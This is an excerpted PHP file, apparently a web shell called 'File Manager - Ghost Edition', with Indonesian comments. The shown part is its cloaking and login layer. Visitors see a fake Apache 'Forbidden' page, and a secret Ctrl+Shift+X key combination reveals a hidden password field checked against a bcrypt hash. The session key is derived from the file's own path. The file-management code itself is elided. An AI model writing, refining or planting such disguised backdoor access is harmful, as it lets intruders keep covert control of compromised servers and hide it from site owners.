<?php
/**
 * File Manager - Ghost Edition (Fixed)
 */

//
$password_hash = '$2y$10$BiAhdMLs9OzfCDzenHTUwuy5EDUzaJsn9m1w.qzzzHX8MA6OzMfbi'; 
...
//
$sessioncode = "auth_" . substr(md5(__FILE__), 0, 8);
...
if (!isset($_SESSION[$sessioncode]) || $_SESSION[$sessioncode] !== true) {
    // Pake $_POST['pass'] langsung
    if (isset($_POST['pass'])) {
        // 
        $input_pass = trim($_POST['pass']);
        
        if (password_verify($input_pass, $password_hash)) {
        ...
        <script>
            document.addEventListener('keydown', function(e) {
                ...
                if (e.ctrlKey && e.shiftKey && e.keyCode === 88) {
                    ...
                    if(form.style.display === 'block') document.getElementById('pass-input').focus();
                }
            });
        </script>
    </head>
    <body style="font-family:sans-serif; background:#fff; color:#000;">
        <h1>Forbidden</h1>
        <p>You don't have permission to access this page on this server.</p>
        <hr><address>Apache Server at <?php echo $_SERVER["HTTP_HOST"]; ?> Port 80</address>
        <div id="ghost-form" style="display:none; margin-top:20px; text-align:center;">
            <form method="POST">
                <input type="password" name="pass" id="pass-input" placeholder="Token..." style="padding:5px; border:1px solid #000;">
